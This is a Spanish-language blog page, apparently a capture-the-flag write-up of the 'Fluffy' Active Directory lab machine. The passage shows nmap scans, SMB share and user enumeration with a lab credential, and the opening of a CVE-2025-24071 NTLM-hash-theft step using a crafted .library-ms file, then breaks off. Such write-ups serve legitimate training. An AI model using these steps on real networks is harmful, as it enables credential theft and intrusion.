<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Fluffy | Cybersecurity Borhub Home</title>
<meta name="keywords" content="">
<meta name="description" content="Writeup sobre la máquina Fluffy en Active Directory de dificultad Easy. En esta máquina explotaremos el CVE-2025-24071 mediante spoofing, luego enumerando en bloodhound veremos un path claro que seguir en el cual explotaremos permisos GenericALL y GenericWrite para llegar a obtener la userflag. Durante la escalada enumeraremos y explotaremos (AD CS) para llegar a conseguir acceso al sistema como administrador.">
<meta name="author" content="">
<link rel="canonical" href="https://borhuub.github.io/write-ups/active_directory/easy/fluffy/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.3f7c354717d256c925885357f6e3db263366c69483a88a7f441fa396c90d7330.css" integrity="sha256-P3w1RxfSVskliFNX9uPbJjNmxpSDqIp/RB&#43;jlskNczA=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://borhuub.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://borhuub.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://borhuub.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://borhuub.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://borhuub.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://borhuub.github.io/write-ups/active_directory/easy/fluffy/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://borhuub.github.io/write-ups/active_directory/easy/fluffy/">
  <meta property="og:site_name" content="Cybersecurity Borhub Home">
  <meta property="og:title" content="Fluffy">
  <meta property="og:description" content="Writeup sobre la máquina Fluffy en Active Directory de dificultad Easy. En esta máquina explotaremos el CVE-2025-24071 mediante spoofing, luego enumerando en bloodhound veremos un path claro que seguir en el cual explotaremos permisos GenericALL y GenericWrite para llegar a obtener la userflag. Durante la escalada enumeraremos y explotaremos (AD CS) para llegar a conseguir acceso al sistema como administrador.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="write-ups">
    <meta property="article:published_time" content="2025-09-11T12:00:00+00:00">
    <meta property="article:modified_time" content="2025-09-11T12:00:00+00:00">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Fluffy">
<meta name="twitter:description" content="Writeup sobre la máquina Fluffy en Active Directory de dificultad Easy. En esta máquina explotaremos el CVE-2025-24071 mediante spoofing, luego enumerando en bloodhound veremos un path claro que seguir en el cual explotaremos permisos GenericALL y GenericWrite para llegar a obtener la userflag. Durante la escalada enumeraremos y explotaremos (AD CS) para llegar a conseguir acceso al sistema como administrador.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Writeups",
      "item": "https://borhuub.github.io/write-ups/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Writeups AD - Dificultad",
      "item": "https://borhuub.github.io/write-ups/active_directory/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Writeups AD - Nivel Easy",
      "item": "https://borhuub.github.io/write-ups/active_directory/easy/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "Fluffy",
      "item": "https://borhuub.github.io/write-ups/active_directory/easy/fluffy/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Fluffy",
  "name": "Fluffy",
  "description": "Writeup sobre la máquina Fluffy en Active Directory de dificultad Easy. En esta máquina explotaremos el CVE-2025-24071 mediante spoofing, luego enumerando en bloodhound veremos un path claro que seguir en el cual explotaremos permisos GenericALL y GenericWrite para llegar a obtener la userflag. Durante la escalada enumeraremos y explotaremos (AD CS) para llegar a conseguir acceso al sistema como administrador.",
  "keywords": [
    
  ],
  "articleBody": "\nReconocimiento Escaneo de puertos abiertos:\n❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.69 -oG ports [sudo] contraseña para borhub: Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-25 20:58 CEST Initiating SYN Stealth Scan at 20:58 Scanning 10.10.11.69 [65535 ports] Discovered open port 53/tcp on 10.10.11.69 Discovered open port 139/tcp on 10.10.11.69 Discovered open port 445/tcp on 10.10.11.69 Discovered open port 49678/tcp on 10.10.11.69 Discovered open port 49776/tcp on 10.10.11.69 Discovered open port 49677/tcp on 10.10.11.69 Discovered open port 49680/tcp on 10.10.11.69 Discovered open port 464/tcp on 10.10.11.69 Discovered open port 49667/tcp on 10.10.11.69 Discovered open port 593/tcp on 10.10.11.69 Discovered open port 389/tcp on 10.10.11.69 Discovered open port 3268/tcp on 10.10.11.69 Discovered open port 5985/tcp on 10.10.11.69 Discovered open port 88/tcp on 10.10.11.69 Discovered open port 3269/tcp on 10.10.11.69 Discovered open port 636/tcp on 10.10.11.69 Discovered open port 9389/tcp on 10.10.11.69 Discovered open port 49704/tcp on 10.10.11.69 Discovered open port 49698/tcp on 10.10.11.69 Completed SYN Stealth Scan at 20:59, 26.35s elapsed (65535 total ports) Nmap scan report for 10.10.11.69 Host is up, received user-set (0.035s latency). Scanned at 2025-05-25 20:58:37 CEST for 26s Not shown: 65516 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49677/tcp open unknown syn-ack ttl 127 49678/tcp open unknown syn-ack ttl 127 49680/tcp open unknown syn-ack ttl 127 49698/tcp open unknown syn-ack ttl 127 49704/tcp open unknown syn-ack ttl 127 49776/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 26.40 seconds Raw packets sent: 131065 (5.767MB) | Rcvd: 33 (1.452KB) Escaneo de servicios:\n❯ sudo nmap -sCV -p 53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49680,49698,49704,49776 10.10.11.69 -oN targeted Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-25 21:01 CEST Nmap scan report for 10.10.11.69 Host is up (0.098s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-26 02:01:08Z) 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-05-26T02:02:38+00:00; +7h00m00s from scanner time. | ssl-cert: Subject: commonName=DC01.fluffy.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:DC01.fluffy.htb | Not valid before: 2025-04-17T16:04:17 |_Not valid after: 2026-04-17T16:04:17 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-05-26T02:02:38+00:00; +7h00m00s from scanner time. | ssl-cert: Subject: commonName=DC01.fluffy.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:DC01.fluffy.htb | Not valid before: 2025-04-17T16:04:17 |_Not valid after: 2026-04-17T16:04:17 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-05-26T02:02:38+00:00; +7h00m00s from scanner time. | ssl-cert: Subject: commonName=DC01.fluffy.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:DC01.fluffy.htb | Not valid before: 2025-04-17T16:04:17 |_Not valid after: 2026-04-17T16:04:17 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.fluffy.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:DC01.fluffy.htb | Not valid before: 2025-04-17T16:04:17 |_Not valid after: 2026-04-17T16:04:17 |_ssl-date: 2025-05-26T02:02:38+00:00; +7h00m00s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49677/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49678/tcp open msrpc Microsoft Windows RPC 49680/tcp open msrpc Microsoft Windows RPC 49698/tcp open msrpc Microsoft Windows RPC 49704/tcp open msrpc Microsoft Windows RPC 49776/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2025-05-26T02:01:58 |_ start_date: N/A |_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 97.68 seconds SMB Enumeration Listado de recursos compartidos con smbclient:\n❯ smbclient -N -L \\\\\\\\10.10.11.69 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC IT Disk NETLOGON Disk Logon server share SYSVOL Disk Logon server share SMB1 disabled -- no workgroup available Uso de netexec para listar las carpetas compartidas pero esta vez con las credenciales que tenemos.\n❯ nxc smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares SMB 10.10.11.69 445 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) SMB 10.10.11.69 445 DC01 [+] fluffy.htb\\j.fleischman:J0elTHEM4n1990! SMB 10.10.11.69 445 DC01 [*] Enumerated shares SMB 10.10.11.69 445 DC01 Share Permissions Remark SMB 10.10.11.69 445 DC01 ----- ----------- ------ SMB 10.10.11.69 445 DC01 ADMIN$ Remote Admin SMB 10.10.11.69 445 DC01 C$ Default share SMB 10.10.11.69 445 DC01 IPC$ READ Remote IPC SMB 10.10.11.69 445 DC01 IT READ,WRITE SMB 10.10.11.69 445 DC01 NETLOGON READ Logon server share SMB 10.10.11.69 445 DC01 SYSVOL READ Logon server share Listado de usuarios con netexec.\n❯ nxc smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --users SMB 10.10.11.69 445 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) SMB 10.10.11.69 445 DC01 [+] fluffy.htb\\j.fleischman:J0elTHEM4n1990! SMB 10.10.11.69 445 DC01 -Username- -Last PW Set- -BadPW- -Description- SMB 10.10.11.69 445 DC01 Administrator 2025-04-17 15:45:01 0 Built-in account for administering the computer/domain SMB 10.10.11.69 445 DC01 Guest 0 Built-in account for guest access to the computer/domain SMB 10.10.11.69 445 DC01 krbtgt 2025-04-17 16:00:02 0 Key Distribution Center Service Account SMB 10.10.11.69 445 DC01 ca_svc 2025-04-17 16:07:50 0 SMB 10.10.11.69 445 DC01 ldap_svc 2025-04-17 16:17:00 0 SMB 10.10.11.69 445 DC01 p.agila 2025-04-18 14:37:08 0 SMB 10.10.11.69 445 DC01 winrm_svc 2025-05-18 00:51:16 0 SMB 10.10.11.69 445 DC01 j.coffey 2025-04-19 12:09:55 0 SMB 10.10.11.69 445 DC01 j.fleischman 2025-05-16 14:46:55 0 SMB 10.10.11.69 445 DC01 [*] Enumerated 9 local users: FLUFFY Ahora nos conectamos a la carpeta IT para ver que contiene.\n❯ smbclient \\\\\\\\10.10.11.69\\\\IT -U FLUFFY.HTB0\\\\j.fleischman Can't load /etc/samba/smb.conf - run testparm to debug it Password for [FLUFFY.HTB0\\j.fleischman]: Try \"help\" to get a list of possible commands. smb: \\\u003e ls . D 0 Mon May 26 02:26:36 2025 .. D 0 Mon May 26 02:26:36 2025 Everything-1.4.1.1026.x64 D 0 Fri Apr 18 17:08:44 2025 Everything-1.4.1.1026.x64.zip A 1827464 Fri Apr 18 17:04:05 2025 KeePass-2.58 D 0 Fri Apr 18 17:08:38 2025 KeePass-2.58.zip A 3225346 Fri Apr 18 17:03:17 2025 Upgrade_Notice.pdf A 169963 Sat May 17 16:31:07 2025 5842943 blocks of size 4096. 2074926 blocks available smb: \\\u003e get Upgrade_Notice.pdf getting file \\Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (128,8 KiloBytes/sec) (average 128,8 KiloBytes/sec) Vemos que tenemos varios archivos interesantes, primero vamos a ver que contiene el archivo de noticias en pdf.\nDentro del archivo PDF vemos que es un mensaje para los administradores, ya que al parecer han salido varios CVE y les indica que tienen que actualizar el sistema. Mirando los CVE críticos vemos que con uno de ellos tenemos la posibilidad de hacer spoofing para obtener hashes NTLM.\nCVE-2025-24071: Vulnerabilidad de Spoofing en Windows File Explorer Esta vulnerabilidad permite a atacantes no autenticados robar hashes NTLM mediante rutas SMB maliciosas.\nPrimero tenemos que crear el zip con el archivo .library-ms:\n#Contenido .library-ms \u003c?xml version=\"1.0\"?\u003e ",
  "wordCount" : "3947",
  "inLanguage": "en",
  "datePublished": "2025-09-11T12:00:00Z",
  "dateModified": "2025-09-11T12:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://borhuub.github.io/write-ups/active_directory/easy/fluffy/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Cybersecurity Borhub Home",
    "logo": {
      "@type": "ImageObject",
      "url": "https://borhuub.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://borhuub.github.io/" accesskey="h" title="Cybersecurity Borhub Home (Alt + H)">Cybersecurity Borhub Home</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://borhuub.github.io/" title="Inicio">
                    <span>Inicio</span>
                </a>
            </li>
            <li>
                <a href="https://borhuub.github.io/write-ups/" title="Write-Ups">
                    <span>Write-Ups</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Fluffy
    </h1>
    <div class="post-description">
      Writeup sobre la máquina Fluffy en Active Directory de dificultad Easy. En esta máquina explotaremos el CVE-2025-24071 mediante spoofing, luego enumerando en bloodhound veremos un path claro que seguir en el cual explotaremos permisos GenericALL y GenericWrite para llegar a obtener la userflag. Durante la escalada enumeraremos y explotaremos (AD CS) para llegar a conseguir acceso al sistema como administrador.
    </div>
    <div class="post-meta"><span title='2025-09-11 12:00:00 +0000 UTC'>September 11, 2025</span>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#reconocimiento" aria-label="Reconocimiento">Reconocimiento</a></li>
                <li>
                    <a href="#smb-enumeration" aria-label="SMB Enumeration">SMB Enumeration</a><ul>
                        
                <li>
                    <a href="#cve-2025-24071-vulnerabilidad-de-spoofing-en-windows-file-explorer" aria-label="CVE-2025-24071: Vulnerabilidad de Spoofing en Windows File Explorer">CVE-2025-24071: Vulnerabilidad de Spoofing en Windows File Explorer</a></li></ul>
                </li>
                <li>
                    <a href="#bloodhound-enumeration" aria-label="Bloodhound Enumeration">Bloodhound Enumeration</a><ul>
                        <ul>
                        
                <li>
                    <a href="#abusing-genericall---bloodyad" aria-label="Abusing GenericAll - BloodyAD">Abusing GenericAll - BloodyAD</a></li>
                <li>
                    <a href="#user-ca_svc---abusing-genericwrite---shadow-credential-attack-pywhisker" aria-label="User ca_svc - Abusing GenericWrite - Shadow credential attack (pywhisker)">User ca_svc - Abusing GenericWrite - Shadow credential attack (pywhisker)</a></li>
                <li>
                    <a href="#user-winrm_svc---abusing-genericwrite---shadow-credential-attack-pywhisker" aria-label="User winrm_svc - Abusing GenericWrite - Shadow credential attack (pywhisker)">User winrm_svc - Abusing GenericWrite - Shadow credential attack (pywhisker)</a></li></ul>
                    </ul>
                </li>
                <li>
                    <a href="#escalada-de-privilegios" aria-label="Escalada de Privilegios">Escalada de Privilegios</a><ul>
                        
                <li>
                    <a href="#enumeraci%c3%b3n-del-dc-con-el-script-adpeas" aria-label="Enumeración del DC con el script adPEAS">Enumeración del DC con el script adPEAS</a></li>
                <li>
                    <a href="#esc16-explotation-case-with-certipy" aria-label="ESC16 explotation case with certipy">ESC16 explotation case with certipy</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p><img alt="Fluffy Machine 1" loading="lazy" src="/write-ups/active_directory/easy/fluffy/fotos/Fluffy_Machine_1.png"></p>
<h1 id="reconocimiento">Reconocimiento<a hidden class="anchor" aria-hidden="true" href="#reconocimiento">#</a></h1>
<p>Escaneo de puertos abiertos:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ sudo nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 10.10.11.69 -oG ports
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> contraseña para borhub:
</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-05-25 20:58 CEST
</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 20:58
</span></span><span style="display:flex;"><span>Scanning 10.10.11.69 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Discovered open port 53/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Discovered open port 139/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Discovered open port 49678/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Discovered open port 49776/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Discovered open port 49677/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Discovered open port 49680/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Discovered open port 464/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Discovered open port 49667/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Discovered open port 593/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Discovered open port 389/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Discovered open port 3268/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Discovered open port 5985/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Discovered open port 88/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Discovered open port 3269/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Discovered open port 636/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Discovered open port 9389/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Discovered open port 49704/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Discovered open port 49698/tcp on 10.10.11.69
</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 20:59, 26.35s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.69
</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>0.035s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Scanned at 2025-05-25 20:58:37 CEST <span style="color:#66d9ef">for</span> 26s
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65516</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE          REASON
</span></span><span style="display:flex;"><span>53/tcp    open  domain           syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec     syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn      syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>389/tcp   open  ldap             syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds     syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5         syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>593/tcp   open  http-rpc-epmap   syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>636/tcp   open  ldapssl          syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>3268/tcp  open  globalcatLDAP    syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>3269/tcp  open  globalcatLDAPssl syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>5985/tcp  open  wsman            syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>9389/tcp  open  adws             syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>49667/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>49677/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>49678/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>49680/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>49698/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>49704/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>49776/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 26.40 seconds
</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">131065</span> <span style="color:#f92672">(</span>5.767MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">33</span> <span style="color:#f92672">(</span>1.452KB<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Escaneo de servicios:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ sudo nmap -sCV -p 53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49680,49698,49704,49776 10.10.11.69 -oN targeted
</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-05-25 21:01 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.69
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.098s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-05-26 02:01:08Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: fluffy.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssl-date: 2025-05-26T02:02:38+00:00; +7h00m00s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.fluffy.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
</span></span><span style="display:flex;"><span>| Not valid before: 2025-04-17T16:04:17
</span></span><span style="display:flex;"><span>|_Not valid after:  2026-04-17T16:04:17
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: fluffy.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssl-date: 2025-05-26T02:02:38+00:00; +7h00m00s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.fluffy.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
</span></span><span style="display:flex;"><span>| Not valid before: 2025-04-17T16:04:17
</span></span><span style="display:flex;"><span>|_Not valid after:  2026-04-17T16:04:17
</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: fluffy.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssl-date: 2025-05-26T02:02:38+00:00; +7h00m00s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.fluffy.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
